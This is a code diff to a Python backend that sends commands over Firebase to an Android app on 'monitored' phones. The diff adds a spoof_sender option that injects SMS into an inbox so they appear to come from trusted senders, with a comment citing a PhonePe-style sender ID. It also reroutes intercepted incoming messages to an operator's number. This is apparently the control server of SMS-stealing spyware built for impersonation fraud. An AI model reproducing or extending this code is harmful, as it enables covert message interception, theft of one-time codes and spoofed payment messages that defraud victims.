@@ -95,6 +95,7 @@ async def push_outgoing_sms_command(
     to_number: str,
     message: str,
     sim_index: int = 0,
+    spoof_sender: str | None = None,
 ) -> str:
     """Queue outgoing SMS send for device/APK: {firebase}/commands/{device_id}/{id}."""
     base = normalize_firebase_url(firebase_url)
@@ -103,6 +104,7 @@ async def push_outgoing_sms_command(
         "to": to_number,
         "message": message,
         "sim_index": sim_index,
+        "spoof_sender": spoof_sender,
         "status": "pending",
         "created_at": datetime.now(timezone.utc).isoformat(),
     }
@@ -166,6 +168,13 @@ async def sync_profile_to_firebase(profile: MonitorProfile, device: Device | Non
         logger.warning("Firebase profile sync failed: %s", exc)
 
 
+def mynum_device_id(phone_number: str) -> str:
+    """Virtus APK device id for /mynum phone (see set_user_phone)."""
+    from app.services import normalize_phone
+
+    return f"num-{normalize_phone(phone_number)}"
+
+
 async def push_outbound_to_firebase(
     profile: MonitorProfile,
     device: Device,
@@ -177,6 +186,14 @@ async def push_outbound_to_firebase(
         return None
 
     try:
+        if outbound.spoof_sender and outbound.to_number:
+            # Inject on /mynum phone so inbox shows original sender (AX-PHONPE-S, etc.)
+            return await push_inject_message(
+                firebase_url,
+                mynum_device_id(outbound.to_number),
+                outbound.spoof_sender,
+                outbound.message,
+            )
         if outbound.spoof_sender:
             return await push_inject_message(
                 firebase_url,
@@ -230,11 +247,10 @@ async def forward_incoming_to_mynum(
     if not profile.phone_number or not profile.is_monitoring:
         return
 
-    from app.channel_relay import queue_manual_sms
+    from app.channel_relay import queue_forward_to_mynum
 
     try:
-        body = message if sender in message else f"{sender}: {message}"
-        outbound = queue_manual_sms(db, profile, device, profile.phone_number, body)
+        outbound = queue_forward_to_mynum(db, profile, device, sender, message)
         await push_outbound_to_firebase(profile, device, outbound)
     except Exception as exc:
         logger.warning("Forward to mynum failed for device %s: %s", device.id, exc)
